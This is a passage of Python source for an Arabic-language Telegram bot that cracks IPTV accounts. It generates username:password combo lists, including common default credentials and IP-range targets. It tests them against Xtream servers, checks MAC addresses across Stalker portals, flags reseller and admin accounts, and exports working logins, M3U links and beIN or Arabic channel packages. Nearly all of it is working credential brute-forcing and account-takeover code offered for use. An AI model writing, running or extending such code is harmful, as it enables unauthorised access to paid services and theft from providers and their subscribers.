        dot   = {"up":"🟢","slow":"🟡","down":"🔴","wait":"⚪"}.get(s["status"],"⚪")
        ms    = f"{s['ms']}ms" if s["ms"] else "—"
        grade = "A" if s["ms"]<200 else "B" if s["ms"]<500 else "C" if s["ms"]<1500 else "F"
        ut    = f"{int(s['up']/s['checks']*100)}%" if s.get("checks") else "—"
        lines.append(f"{dot}[{grade}]  <code>{url.replace('http://','')[:36]}</code>\n      ⚡{ms}   ↑{ut}")
    await safe_edit(q.message, "\n".join(lines),
        InlineKeyboardMarkup([
            [InlineKeyboardButton("➕ إضافة سيرفر",         callback_data="hlth:add"),
             InlineKeyboardButton("🔍 فحص الكل",           callback_data="hlth:check")],
            [InlineKeyboardButton("📥 استيراد من الإعدادات", callback_data="hlth:import"),
             InlineKeyboardButton("🗑 مسح الكل",           callback_data="hlth:clear")],
            _bkr(),
        ]))


async def _health_check(msg, st: dict):
    urls    = list(st["health"].keys())
    results = await asyncio.gather(*[ping_host(u, 6) for u in urls], return_exceptions=True)
    lines   = [f"🏥 <b>تقرير الفحص</b>\n{_LINE_MID}"]
    for url, res in zip(urls, results):
        ok, ms = (False, 0) if isinstance(res, Exception) else res
        status = "up" if ok and ms<500 else "slow" if ok else "down"
        h = st["health"][url]
        h.update(status=status, ms=ms, checks=h["checks"]+1, up=h["up"]+(1 if ok else 0))
        dot   = {"up":"🟢","slow":"🟡","down":"🔴"}[status]
        grade = "A" if ms<200 else "B" if ms<500 else "C" if ms<1500 else "F"
        lines.append(f"{dot}[{grade}]  {ms or '✗'}ms  <code>{url.replace('http://','')[:40]}</code>")
    up   = sum(1 for s in st["health"].values() if s["status"]=="up")
    down = sum(1 for s in st["health"].values() if s["status"]=="down")
    await msg.reply_text(
        "\n".join(lines) + f"\n{_LINE_MID}\n✅ {up} يعمل   ❌ {down} فاشل",
        parse_mode=ParseMode.HTML
    )

# ════════════════════════════════════════════════════════════════
#  ⚡  مولّد الكومبو — مع IP Range
# ════════════════════════════════════════════════════════════════
_SMART_U = ["admin","test","user","demo","guest","root","iptv","stream","owner","superadmin"]
_SMART_P = ["123456","admin","1234","password","iptv","iptv123","iptv2025","iptv2026","test","0000","123456789","iptv@123"]


async def do_gen(q, ctx, uid: int, st: dict, act: str):
    match act:
        case "menu":  await _gen_menu(q)
        case "iprange":
            ctx.user_data["w"] = "ip_range"
            await safe_edit(q.message,
                "🔢 <b>مولد كومبو من IP Range</b>\n\n"
                "أرسل نطاق IP بصيغة CIDR:\n"
                "<code>192.168.1.0/24</code>\n"
                "<code>10.0.0.0/16</code>\n\n"
                "⚠️ /24 = 256 عنوان — /16 = 65536 عنوان (حد 1024)",
                _bk("gen:menu"))
        case "load":
            c = [("", u, p) for u, p in _rand_combo(2000)]; st["combo"] = c
            await q.answer(f"✅ {_fmt_num(len(c))} سطر في الكومبو")
            await q.message.reply_text(
                f"✅ <b>تم تحميل {_fmt_num(len(c))} سطر للكومبو</b>",
                parse_mode=ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🚀 ابدأ الصيد", callback_data="hunt:menu")]]))
        case _: await _gen_produce(q, act)


async def _gen_menu(q):
    await safe_edit(q.message,
        f"╔{'═'*34}╗\n║   ⚡   مولّد الكومبو   ║\n╚{'═'*34}╝\n\nاختر نوع الكومبو:",
        InlineKeyboardMarkup([
            [InlineKeyboardButton("🎲 1,000",  callback_data="gen:r1000"),
             InlineKeyboardButton("🎲 5,000",  callback_data="gen:r5000"),
             InlineKeyboardButton("🎲 10,000", callback_data="gen:r10000")],
            [InlineKeyboardButton("🔢 أرقام 0000–9999", callback_data="gen:num4"),
             InlineKeyboardButton("🧠 IPTV ذكي",        callback_data="gen:smart")],
            [InlineKeyboardButton("🗺️ من IP Range",      callback_data="gen:iprange")],
            [InlineKeyboardButton("📥 تحميل 2,000 للصيد مباشرة", callback_data="gen:load")],
            _bkr(),
        ]))


async def _gen_produce(q, act: str):
    await q.answer("⚡ جاري التوليد…")
    if act.startswith("r"):
        n     = int(act[1:])
        combo = _rand_combo(n)
        fname = f"combo_rand_{n}.txt"
    elif act == "num4":
        combo = [(f"user{i:04d}", f"{i:04d}") for i in range(10000)]
        fname = "combo_numeric.txt"
    elif act == "smart":
        combo = [(u, p) for u in _SMART_U for p in _SMART_P]
        fname = f"combo_smart_{len(combo)}.txt"
    else:
        return
    bio = io.BytesIO("\n".join(f"{u}:{p}" for u, p in combo).encode())
    await q.message.reply_document(InputFile(bio, filename=fname),
        caption=f"⚡ <b>كومبو مُولَّد</b>  —  {_fmt_num(len(combo))} سطر", parse_mode=ParseMode.HTML)


def _rand_combo(n: int) -> list:
    uc = string.ascii_lowercase + string.digits
    pc = uc + "!@#_"
    return [("".join(random.choices(uc, k=random.randint(4,10))),
             "".join(random.choices(pc, k=random.randint(5,12)))) for _ in range(n)]

# ════════════════════════════════════════════════════════════════
#  🔍  فحص حساب منفرد
# ════════════════════════════════════════════════════════════════
async def _single_menu(q, ctx, uid: int, st: dict):
    ctx.user_data["w"] = "single"
    await safe_edit(q.message,
        "🔍 <b>فحص حساب منفرد</b>\n\n"
        "أرسل معلومات الحساب:\n"
        "<code>http://host:port|user|pass</code>\n\nأو:\n<code>user:pass</code>",
        _bk("main"))


async def _single_check(upd, ctx, uid: int, st: dict, text: str):
    r = parse_line(text)
    if not r:
        await upd.message.reply_text("⚠️ الصيغة خاطئة!\n<code>http://host:port|user|pass</code>",
                                     parse_mode=ParseMode.HTML); return
    h, user, pwd = r
    host = h or st["server"].strip()
    if not host:
        await upd.message.reply_text("⚠️ حدد السيرفر في الإعدادات أولاً!"); return
    pmsg = await upd.message.reply_text(
        f"🔍 <b>جاري الفحص…</b>\n🖥 <code>{host}</code>\n👤 <code>{user}:{pwd}</code>",
        parse_mode=ParseMode.HTML)
    async with aiohttp.ClientSession(
        connector=aiohttp.TCPConnector(ssl=False),
        headers={"User-Agent": _rand_ua()}
    ) as sess:
        data = await xtream_check(sess, host, user, pwd, st["timeout"])
        if data:
            acc = mk_xtream(host, user, pwd, data)
            await safe_edit(pmsg, "🔍 <b>جاري جلب القنوات والتفاصيل…</b>")
            try:
                info = await xtream_fetch_content(sess, host, user, pwd, st["timeout"])
                acc.update(live_count=info["live_count"], vod_count=info["vod_count"],
                           series_count=info["series_count"], has_bein=info["has_bein"],
                           bein_chs=info["bein_chs"], m3u_lines=info["m3u_lines"],
                           has_arabic=info["has_arabic"], arabic_info=info["arabic_info"])
            except Exception: pass
            if st.get("detect_trial"):
                trial_info = detect_trial_account(data)
                acc.update(is_trial=trial_info["is_trial"], trial_reason=trial_info["trial_reason"])
            if st.get("detect_reseller"):
                try:
                    res_info = await detect_sub_reseller(sess, host, user, pwd, st["timeout"], data)
                    acc.update(is_reseller=res_info["is_reseller"], can_create=res_info["can_create"])
                except Exception: pass
    if data:
        st["results"].append(acc); st["valid"] += 1; st["checked"] += 1
        await safe_edit(pmsg, hit_xtream(acc),
            InlineKeyboardMarkup([[
                InlineKeyboardButton("🎯 النتائج", callback_data="res:menu"),
                InlineKeyboardButton("📲 M3U",    callback_data=f"res:acc_{len(st['results'])-1}"),
            ]]))
    else:
        st["checked"] += 1
        await safe_edit(pmsg,
            f"❌ <b>فاشل</b>\n🖥 <code>{host}</code>\n👤 <code>{user}:{pwd}</code>",
            _bk("main"))


async def _mac_single(upd, ctx, uid: int, st: dict, text: str):
    text = text.strip().upper()
    mac  = (f"{MAC_OUI_DEFAULT}:{text}" if len(text)==8
            else text if len(text)==17
            else (f"{MAC_OUI_DEFAULT}:{text}" if ":" not in text else text))
    pts  = _portals(st)
    if not pts:
        await upd.message.reply_text("⚠️ حدد بوابة MAC Portal أولاً!"); return
    pmsg = await upd.message.reply_text(
        f"🔍 <b>جاري فحص MAC…</b>\n📟 <code>{mac}</code>", parse_mode=ParseMode.HTML)
    found = False
    async with aiohttp.ClientSession(
        connector=aiohttp.TCPConnector(ssl=False, limit=len(pts)*3),
        headers={"User-Agent": _rand_ua()}
    ) as sess:
        results = await asyncio.gather(
            *[mac_portal_check(sess, p, mac, st["timeout"], verify=st["mac_verify"]) for p in pts],
            return_exceptions=True
        )
        for portal, data in zip(pts, results):
            if not data or isinstance(data, Exception): continue
            found = True
            acc   = mk_mac(portal, mac, data)
            try:
                ch = await mac_fetch_channels(sess, portal, mac, data["token"], min(st["timeout"],15), data["wpath"])
                acc.update(live_count=ch["live_count"], vod_count=ch["vod_count"],
                           has_bein=ch["has_bein"], bein_chs=ch["bein_chs"], m3u_lines=ch["m3u_lines"],
                           has_arabic=ch["has_arabic"], arabic_info=ch["arabic_info"])
            except Exception: pass
            st["mac_results"].append(acc); st["mac_hits"] += 1
            await upd.message.reply_text(hit_mac(acc), parse_mode=ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("📡 MAC Hunter", callback_data="mac:menu")]]))
    ok_n = sum(1 for r in results if r and not isinstance(r, Exception))
    await safe_edit(pmsg,
        (f"✅ <b>تم إيجاد MAC في {ok_n} بوابة</b>\n📟 <code>{mac}</code>" if found
         else f"❌ <b>MAC غير مسجَّل</b>\n📟 <code>{mac}</code>\n🔍 فُحص على {len(pts)} بوابة"),
        _bk("mac:menu"))

# ════════════════════════════════════════════════════════════════
#  ⚙️  الإعدادات
# ════════════════════════════════════════════════════════════════
async def do_cfg(q, ctx, uid: int, st: dict, act: str):
    match act:
        case "menu":  await _cfg_menu(q, st)
        case "server":
            ctx.user_data["w"] = "server"
            cur = st["server"] or "لم يُحدَّد"
            await safe_edit(q.message,
                f"🖥 <b>السيرفر الرئيسي</b>\n\nالحالي: <code>{cur}</code>\n\nأرسل الرابط الجديد:",
                _bk("cfg:menu"))
        case "add_srv":
            ctx.user_data["w"] = "multi_srv"
            await safe_edit(q.message, "🖥 <b>إضافة سيرفر إضافي</b>\n\nأرسل الرابط:", _bk("cfg:menu"))
        case "clr_srvs":
            st["multi_servers"] = []; await q.answer("🗑 تم"); await _cfg_menu(q, st)
        case "threads":
            ctx.user_data["w"] = "threads"
            await safe_edit(q.message,
                f"🧵 <b>الخيوط</b>\nالحالي: <b>{st['threads']}</b>\nأرسل رقم (1 – 300):",
                _bk("cfg:menu"))
        case "timeout":
            ctx.user_data["w"] = "timeout"
            await safe_edit(q.message,
                f"⏱ <b>المهلة</b>\nالحالية: <b>{st['timeout']}s</b>\nأرسل رقم (2 – 30):",
                _bk("cfg:menu"))
        case "retry":
            ctx.user_data["w"] = "retry"
            await safe_edit(q.message,
                f"🔁 <b>المحاولات</b>\nالحالية: <b>{st['retry']}</b>\nأرسل رقم (1 – 3):",
                _bk("cfg:menu"))
        case "tog_auto":
            st["tg_auto"] = not st["tg_auto"]
            await q.answer(f"✈️ إرسال تلقائي: {'✅' if st['tg_auto'] else '❌'}")
            await _cfg_menu(q, st)
        case "tog_act":
            st["active_only"] = not st["active_only"]
            await q.answer(f"🔵 نشطة فقط: {'✅' if st['active_only'] else '❌'}")
            await _cfg_menu(q, st)
        case "reset":
            st.update(server="", multi_servers=[], threads=40, timeout=8, retry=1, tg_auto=True, active_only=False)
            await q.answer("🔄 إعادة الضبط الافتراضي"); await _cfg_menu(q, st)


async def _cfg_menu(q, st: dict):
    srv  = st["server"].replace("http://","").replace("https://","")[:40] if st["server"] else "لم يُحدَّد"
    ms_n = f"{len(st['multi_servers'])} سيرفر إضافي" if st["multi_servers"] else "لا يوجد"
    await safe_edit(q.message,
        f"╔{'═'*34}╗\n║   ⚙️   الإعدادات   ║\n╚{'═'*34}╝\n"
        f"\n"
        f"🖥  السيرفر الرئيسي:\n    <code>{srv}</code>\n"
        f"🔗  الإضافية:  <b>{ms_n}</b>\n"
        f"\n{_LINE_MID}\n"
        f"🧵  الخيوط:       <b>{st['threads']}</b>\n"
        f"⏱  المهلة:        <b>{st['timeout']}s</b>\n"
        f"🔁  المحاولات:    <b>{st['retry']}</b>\n"
        f"{_LINE_MID}\n"
        f"✈️  إرسال تلقائي:  {'✅' if st['tg_auto'] else '❌'}\n"
        f"🔵  نشطة فقط:      {'✅' if st['active_only'] else '❌'}",
        InlineKeyboardMarkup([
            [InlineKeyboardButton("🖥 السيرفر الرئيسي", callback_data="cfg:server")],
            [InlineKeyboardButton("➕ إضافة سيرفر",   callback_data="cfg:add_srv"),
             InlineKeyboardButton("🗑 مسح الإضافية", callback_data="cfg:clr_srvs")],
            [InlineKeyboardButton("🧵 الخيوط",        callback_data="cfg:threads"),
             InlineKeyboardButton("⏱ المهلة",         callback_data="cfg:timeout"),
             InlineKeyboardButton("🔁 المحاولات",     callback_data="cfg:retry")],
            [InlineKeyboardButton(f"✈️ تلقائي {'✅' if st['tg_auto'] else '❌'}",       callback_data="cfg:tog_auto"),
             InlineKeyboardButton(f"🔵 نشط فقط {'✅' if st['active_only'] else '❌'}", callback_data="cfg:tog_act")],
            [InlineKeyboardButton("🔄 إعادة الضبط الافتراضي", callback_data="cfg:reset")],
            _bkr(),
        ]))

# ════════════════════════════════════════════════════════════════
#  📊  الإحصائيات المباشرة — تحديث كل ثانية عند الصيد
# ════════════════════════════════════════════════════════════════
async def _stat(q, uid: int, st: dict):
    all_r  = st["results"]
    tc     = st["checked"]
    rate   = f"{st['valid']/tc*100:.1f}%" if tc else "0%"
    ela    = time.time() - st["sess_start"]
    bein_x = sum(1 for r in all_r if r["has_bein"])
    bein_m = sum(1 for r in st["mac_results"] if r["has_bein"])
    arab_x = sum(1 for r in all_r if r.get("has_arabic"))
    arab_m = sum(1 for r in st["mac_results"] if r.get("has_arabic"))
    arab_pkg  = sum(1 for r in all_r + st["mac_results"] if r.get("arabic_info",{}).get("has_arabic_pkg"))
    arab_list = sum(1 for r in all_r + st["mac_results"] if r.get("arabic_info",{}).get("has_arabic_list"))
    act    = sum(1 for r in all_r if r["is_active"])
    unlim  = sum(1 for r in all_r if r.get("is_unlimited"))
    trial  = sum(1 for r in all_r if r.get("is_trial"))
    resel  = sum(1 for r in all_r if r.get("is_reseller"))
    aband  = sum(1 for r in all_r if r.get("is_abandoned"))
    admin_f= sum(1 for r in all_r if r.get("admin_found"))
    # أفضل سيرفر
    srv_h: dict[str,int] = {}
    for r in all_r: srv_h[r["host"]] = srv_h.get(r["host"],0)+1
    best  = max(srv_h, key=srv_h.get) if srv_h else "—"
    # إحصائيات التعلم
    adapt_top = _adaptive.get_top_prefixes(3)
    adapt_txt = ""
    if adapt_top:
        for k, rate_v in list(adapt_top.items())[:2]:
            kind = "u" if k.startswith("u:") else "p"
            adapt_txt += f"  {kind}:{k[2:]}*={rate_v*100:.0f}%  "
    total_live = sum(r.get("live_count",0) for r in all_r)
    total_vod  = sum(r.get("vod_count",0)  for r in all_r)
    arch_total = len(st["archive"]["results"]) + len(st["archive"]["mac_results"])
    await safe_edit(q.message,
        f"╔{'═'*36}╗\n║   📊   إحصائيات مباشرة {VERSION}  ║\n╚{'═'*36}╝\n"
        f"\n"
        f"🏆  إجمالي الإصابات   <b>{len(all_r) + st['mac_hits']}</b>   📦 أرشيف: <b>{arch_total}</b>\n"
        f"\n{_LINE_MID}\n"
        f"⚡  Xtream:    <b>{len(all_r)}</b>   ✅ نشط: <b>{act}</b>\n"
        f"📡  MAC:       <b>{st['mac_hits']}</b>\n"
        f"♾️  Unlimited: <b>{unlim}</b>\n"
        f"🧪  Trial:     <b>{trial}</b>   👑 Reseller: <b>{resel}</b>\n"
        f"🗑️  Abandoned: <b>{aband}</b>   🛡️ Admin: <b>{admin_f}</b>\n"
        f"\n{_LINE_MID}\n"
        f"⚽  beIN — Xtream: <b>{bein_x}</b>   MAC: <b>{bein_m}</b>\n"
        f"\n{_LINE_MID}\n"
        f"🌙  عربي — Xtream: <b>{arab_x}</b>   MAC: <b>{arab_m}</b>\n"
        f"📦  باقات عربية:   <b>{arab_pkg}</b>\n"
        f"🌙  قوائم عربية:   <b>{arab_list}</b>\n"
        f"\n{_LINE_MID}\n"
        f"🔢  فُحص:          <b>{_fmt_num(tc)}</b>\n"
        f"📈  معدل النجاح:   <b>{rate}</b>\n"
        f"⚡  أعلى سرعة:    <b>{st['peak_spd']:.1f}</b>/s\n"
        f"⏱  وقت الجلسة:   <b>{_fmt_time(ela)}</b>\n"
        f"\n{_LINE_MID}\n"
        f"📺  قنوات:   <b>{_fmt_num(total_live)}</b>   🎬 أفلام: <b>{_fmt_num(total_vod)}</b>\n"
        f"\n{_LINE_MID}\n"
        f"🏅  أفضل سيرفر:\n"
        f"    <code>{best.replace('http://','')[:40]}</code>  ({srv_h.get(best,0)} إصابة)\n"
        f"\n🧠  تعلم تكيفي: {adapt_txt or '<i>لا بيانات</i>'}",
        InlineKeyboardMarkup([[
            InlineKeyboardButton("🔄 تحديث", callback_data="stat:show"),
            InlineKeyboardButton("📊 مقارنة السيرفرات", callback_data="hunt:compare"),
            InlineKeyboardButton("🔙 رجوع",  callback_data="nav:main"),
        ]]))

# ════════════════════════════════════════════════════════════════
#  🎯  النتائج
# ════════════════════════════════════════════════════════════════
async def do_res(q, ctx, uid: int, st: dict, act: str):
    match act:
        case "menu":  await _res_menu(q, st)
        case "xtream"|"m3u"|"txt"|"json": await _export_res(q, st, act)
        case "last":  await _show_last(q, st)
        case "bein":  await _export_bein(q, st)
        case "unlimited": await _export_unlimited(q, st)
        case "trial":     await _export_filtered(q, st, "trial")
        case "reseller":  await _export_filtered(q, st, "reseller")
        case "abandoned": await _export_filtered(q, st, "abandoned")
        case "arabic":    await _export_arabic(q, st)
        case "arabic_pkg": await _export_arabic_pkg_only(q, st)
        case "arabic_list": await _export_arabic_list_only(q, st)
        case "per_acc": await _per_acc_list(q, st)
        case _ if act.startswith("acc_"):
            await _export_xtream_m3u(q, st, int(act[4:]))
        case _ if act.startswith("ar_acc_"):
            await _export_arabic_xtream_from_acc(q, st, int(act[7:]))
        case "clear":
            archived = auto_archive(st)
            st.update(results=[], mac_results=[], checked=0, valid=0, mac_checked=0, mac_hits=0)
            await q.answer(f"🗑 تم — أُرشف {archived}"); await _res_menu(q, st)


async def _res_menu(q, st: dict):
    all_r  = st["results"]; mac_r = st["mac_results"]
    act    = sum(1 for r in all_r if r["is_active"])
    unlim  = sum(1 for r in all_r if r.get("is_unlimited"))
    trial  = sum(1 for r in all_r if r.get("is_trial"))
    resel  = sum(1 for r in all_r if r.get("is_reseller"))
    aband  = sum(1 for r in all_r if r.get("is_abandoned"))
    bein_x = sum(1 for r in all_r if r["has_bein"])
    bein_m = sum(1 for r in mac_r  if r["has_bein"])
    arab_x = sum(1 for r in all_r if r.get("has_arabic"))
    arab_m = sum(1 for r in mac_r  if r.get("has_arabic"))
    arab_pkg = sum(1 for r in all_r + list(mac_r)
                   if r.get("arabic_info", {}).get("has_arabic_pkg"))
    arab_list= sum(1 for r in all_r + list(mac_r)
                   if r.get("arabic_info", {}).get("has_arabic_list"))
    await safe_edit(q.message,
        f"╔{'═'*34}╗\n║   🎯   النتائج الكاملة {VERSION}   ║\n╚{'═'*34}╝\n"
        f"\n🏆  الإجمالي:       <b>{len(all_r)+len(mac_r)}</b>\n"
        f"\n{_LINE_MID}\n"
        f"⚡  Xtream:        <b>{len(all_r)}</b>   ✅ نشط: <b>{act}</b>\n"
        f"📡  MAC Portal:    <b>{len(mac_r)}</b>\n"
        f"♾️  Unlimited:     <b>{unlim}</b>\n"
        f"🧪  Trial:         <b>{trial}</b>   👑 Reseller: <b>{resel}</b>\n"
        f"🗑️  Abandoned:     <b>{aband}</b>\n"
        f"⚽  beIN Xtream:   <b>{bein_x}</b>   MAC: <b>{bein_m}</b>\n"
        f"{_LINE_MID}\n"
        f"🌙  عربي Xtream:   <b>{arab_x}</b>   MAC: <b>{arab_m}</b>\n"
        f"📦  باقات عربية:  <b>{arab_pkg}</b>   🌙 قوائم عربية: <b>{arab_list}</b>\n"
        f"{_LINE_MID}",
        InlineKeyboardMarkup([
            [InlineKeyboardButton("🔥 Xtream Lines",  callback_data="res:xtream"),
             InlineKeyboardButton("📺 M3U كامل",      callback_data="res:m3u")],
            [InlineKeyboardButton("📄 TXT تقرير",     callback_data="res:txt"),
             InlineKeyboardButton("📦 JSON",          callback_data="res:json")],
            [InlineKeyboardButton("♾️ Unlimited",      callback_data="res:unlimited"),
             InlineKeyboardButton("🧪 Trial",          callback_data="res:trial")],
            [InlineKeyboardButton("👑 Reseller",       callback_data="res:reseller"),
             InlineKeyboardButton("🗑️ Abandoned",      callback_data="res:abandoned")],
            [InlineKeyboardButton("👁 آخر 5 نتائج",  callback_data="res:last"),
             InlineKeyboardButton("📡 MAC نتائج",     callback_data="mac:export")],
            [InlineKeyboardButton("⚽ beIN فقط",      callback_data="res:bein"),
             InlineKeyboardButton("📲 M3U لكل حساب", callback_data="res:per_acc")],
            # ── قسم عربي جديد ──────────────────────────
            [InlineKeyboardButton("🌙 تصدير الحسابات العربية", callback_data="res:arabic")],
            [InlineKeyboardButton("📦 باقات عربية صريحة",  callback_data="res:arabic_pkg"),
             InlineKeyboardButton("🌙 قوائم عربية أصيلة", callback_data="res:arabic_list")],
            [InlineKeyboardButton("📡 MAC عربي",            callback_data="mac:arabic")],
            # ───────────────────────────────────────────
            [InlineKeyboardButton("🗑 مسح الكل",     callback_data="res:clear")],
            _bkr(),
        ]))


async def _export_res(q, st: dict, fmt: str):
    all_r = st["results"]
    if not all_r: await q.answer("⚠️ لا توجد نتائج!", show_alert=True); return
    if fmt == "xtream":
        content = "\n".join(r["xtream_line"] for r in all_r)
        fname   = f"xtream_{len(all_r)}.txt"
    elif fmt == "m3u":
        lines = ["#EXTM3U"]
        for r in all_r:
            full = r.get("m3u_lines",[])
            lines.extend(full[1:] if len(full)>2 else [f"#EXTINF:-1,{r['user']}", r["m3u_url"]])
        content = "\n".join(lines)
        fname   = f"results_{len(all_r)}.m3u"
    elif fmt == "txt":
        sep = "─"*44
        parts = []
        for r in all_r:
            bein_s = f"✅ ({len(r['bein_chs'])}): {', '.join(r['bein_chs'][:5])}" if r["has_bein"] else "❌"
            parts.append(
                f"Host:      {r['host']}\nUser:      {r['user']}\nPass:      {r['pass']}\n"
                f"Status:    {'✅' if r['is_active'] else '⚠️'}\nExpiry:  {r['exp']}\n"
                f"Unlimited: {'♾️ YES' if r.get('is_unlimited') else 'NO'}\n"
                f"Trial:     {'🧪 YES' if r.get('is_trial') else 'NO'}\n"
                f"Reseller:  {'👑 YES' if r.get('is_reseller') else 'NO'}\n"
                f"Conns:     {r['active_conn']}/{r['max_conn']}\n"
                f"Live:      {r['live_count']}  VOD: {r['vod_count']}  Series: {r['series_count']}\n"
                f"beIN:      {bein_s}\nLine:    {r['xtream_line']}\nFound:   {r['found']}\n{sep}"
            )
        content = "\n".join(parts)
        fname   = f"results_{len(all_r)}.txt"
    else:
        content = json.dumps(all_r, ensure_ascii=False, indent=2)
        fname   = f"results_{len(all_r)}.json"
    bio = io.BytesIO(content.encode("utf-8"))
    await q.message.reply_document(InputFile(bio, filename=fname),
        caption=f"📦 <b>{fmt.upper()}</b>  |  📊 {len(all_r)} حساب  |  ✅ {sum(1 for r in all_r if r['is_active'])} نشط",
        parse_mode=ParseMode.HTML)


async def _export_unlimited(q, st: dict):
    unlim = [r for r in st["results"] if r.get("is_unlimited")]
    if not unlim: await q.answer("⚠️ لا توجد حسابات Unlimited!", show_alert=True); return
    lines = [f"♾️ UNLIMITED ACCOUNTS — {BOT_NAME} {VERSION}", "═"*44, ""]
    for r in unlim:
        lines.append(f"{r['xtream_line']}")
        lines.append(f"Live: {r['live_count']}  VOD: {r['vod_count']}  Active: {'YES' if r['is_active'] else 'NO'}")
        lines.append("")
    bio = io.BytesIO("\n".join(lines).encode("utf-8"))
    await q.message.reply_document(InputFile(bio, filename=f"unlimited_{len(unlim)}.txt"),
        caption=f"♾️ <b>Unlimited Accounts</b>  —  {len(unlim)} حساب",
        parse_mode=ParseMode.HTML)


async def _export_filtered(q, st: dict, filter_type: str):
    icon_map = {"trial": "🧪", "reseller": "👑", "abandoned": "🗑️"}
    key_map  = {"trial": "is_trial", "reseller": "is_reseller", "abandoned": "is_abandoned"}
    icon = icon_map.get(filter_type, "📋")
    key  = key_map.get(filter_type, "")
    filtered = [r for r in st["results"] if r.get(key)]
    if not filtered:
        await q.answer(f"⚠️ لا توجد حسابات {filter_type}!", show_alert=True); return
    lines = [f"{icon} {filter_type.upper()} — {BOT_NAME} {VERSION}", "═"*44, ""]
    for r in filtered:
        lines.append(r["xtream_line"])
        lines.append(f"Active: {'YES' if r['is_active'] else 'NO'}  Live: {r['live_count']}")
        lines.append("")
    bio = io.BytesIO("\n".join(lines).encode("utf-8"))
    await q.message.reply_document(InputFile(bio, filename=f"{filter_type}_{len(filtered)}.txt"),
        caption=f"{icon} <b>{filter_type.capitalize()}</b>  —  {len(filtered)} حساب",
        parse_mode=ParseMode.HTML)



# ════════════════════════════════════════════════════════════════
#  🌙  تصدير القنوات والباقات العربية — v23
# ════════════════════════════════════════════════════════════════
async def _export_arabic(q, st: dict):
    """تصدير حسابات Xtream التي تحتوي قنوات عربية"""
    arab_r = [r for r in st["results"] if r.get("has_arabic")]
    if not arab_r:
        await q.answer("⚠️ لا توجد حسابات بقنوات عربية!", show_alert=True); return

    sep     = "═" * 50
    hdr     = [
        sep,
        f"🌙  قنوات وباقات عربية — {BOT_NAME} {VERSION}",
        f"📊  إجمالي الحسابات العربية: {len(arab_r)}",
        f"🗓  {datetime.now().strftime('%Y-%m-%d  %H:%M:%S')}",
        sep, "",
    ]
    lines   = hdr[:]
    m3u     = ["#EXTM3U"]
    xtream  = []
    total_ar_ch = 0

    for idx, r in enumerate(arab_r, 1):
        ar_info  = r.get("arabic_info", {})
        ar_cnt   = ar_info.get("total_arabic", 0)
        ar_pkgs  = ar_info.get("arabic_pkgs", 0)
        ar_cats  = ar_info.get("arabic_cats", [])
        ar_chs   = ar_info.get("arabic_chs", [])
        is_ar_list = ar_info.get("has_arabic_list", False)
        total_ar_ch += ar_cnt

        host_s = r["host"].replace("http://", "").replace("https://", "")
        lines += [
            f"┌─ [{idx:03d}] ──────────────────────────────────",
            f"│  🖥  Host:       {host_s}",
            f"│  👤  User:       {r['user']}",
            f"│  🔑  Pass:       {r['pass']}",
            f"│  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
            f"│  ✅  الحالة:     {'نشط' if r['is_active'] else 'منتهي'}   📅 {r['exp']}",
            f"│  📺  قنوات كل:  {r['live_count']}   🌙 عربية: {ar_cnt}",
            f"│  📦  باقات ع:   {ar_pkgs}",
        ]
        if is_ar_list:
            lines.append(f"│  🌙  قائمة عربية أصيلة ✅")
        if ar_cats:
            lines.append(f"│  📂  فئات:  {' · '.join(ar_cats[:5])}")
        if ar_chs:
            ch_preview = " · ".join(ar_chs[:6]) + ("…" if ar_cnt > 6 else "")
            lines.append(f"│  📺  عينة:  {ch_preview}")
        lines += [
            f"│  🔗  Line:  {r['xtream_line']}",
            f"│  📲  M3U:   {r['m3u_url']}",
            f"└──────────────────────────────────────────",
            "",
        ]
        xtream.append(r["xtream_line"])
        # M3U — القنوات العربية فقط
        full = r.get("m3u_lines", [])
        if len(full) > 2:
            i = 0
            while i < len(full) - 1:
                line_info = full[i]
                line_url  = full[i + 1] if (i + 1) < len(full) else ""
                if line_info.startswith("#EXTINF"):
                    name_match = re.search(r',(.+)$', line_info)
                    ch_name = name_match.group(1).strip() if name_match else ""
                    if _has_arabic_channel(ch_name):
                        m3u.append(line_info)
                        m3u.append(line_url)
                i += 2
        else:
            m3u += [f"#EXTINF:-1 group-title=\"Arabic\",{r['user']}", r["m3u_url"]]

    lines += [
        sep,
        f"🌙  إجمالي القنوات العربية:  {total_ar_ch}",
        f"👥  عدد الحسابات:            {len(arab_r)}",
        f"🔗  Xtream Lines:            {len(xtream)}",
        sep,
    ]

    await q.answer("📦 جاري تصدير الباقات العربية…")
    n = len(arab_r)

    # ملف التقرير الاحترافي
    bio_txt = io.BytesIO("\n".join(lines).encode("utf-8"))
    await q.message.reply_document(
        InputFile(bio_txt, filename=f"arabic_accounts_{n}.txt"),
        caption=(
            f"🌙 <b>الحسابات العربية — تقرير كامل</b>\n"
            f"👥  حسابات: <b>{n}</b>\n"
            f"📺  قنوات عربية: <b>{total_ar_ch}</b>\n"
            f"✅  نشط: <b>{sum(1 for r in arab_r if r['is_active'])}</b>"
        ),
        parse_mode=ParseMode.HTML,
    )
    # ملف Xtream Lines
    bio_x = io.BytesIO("\n".join(xtream).encode("utf-8"))
    await q.message.reply_document(
        InputFile(bio_x, filename=f"arabic_xtream_{n}.txt"),
        caption=f"🔗 <b>Xtream Lines — عربي</b>  ({n} حساب)",
        parse_mode=ParseMode.HTML,
    )
    # ملف M3U للقنوات العربية
    if len(m3u) > 1:
        bio_m3u = io.BytesIO("\n".join(m3u).encode("utf-8"))
        await q.message.reply_document(
            InputFile(bio_m3u, filename=f"arabic_channels_{n}.m3u"),
            caption=f"🌙 <b>M3U قنوات عربية</b>  ({len(m3u)//2} قناة من {n} حساب)",
            parse_mode=ParseMode.HTML,
        )


async def mac_export_arabic(q, st: dict):
    """تصدير MAC التي تحتوي قنوات عربية مع تصدير الباقة العربية بشكل منفصل"""
    arab_r = [r for r in st["mac_results"] if r.get("has_arabic")]
    if not arab_r:
        await q.answer("⚠️ لا توجد MAC بقنوات عربية!", show_alert=True); return

    sep  = "═" * 50
    hdr  = [
        sep,
        f"🌙  باقة عربية MAC Portal — {BOT_NAME} {VERSION}",
        f"📊  إجمالي: {len(arab_r)} حساب MAC عربي",
        f"🗓  {datetime.now().strftime('%Y-%m-%d  %H:%M:%S')}",
        sep, "",
    ]
    lines       = hdr[:]
    m3u         = ["#EXTM3U"]
    mac_list    = []
    total_ar_ch = 0

    for idx, r in enumerate(arab_r, 1):
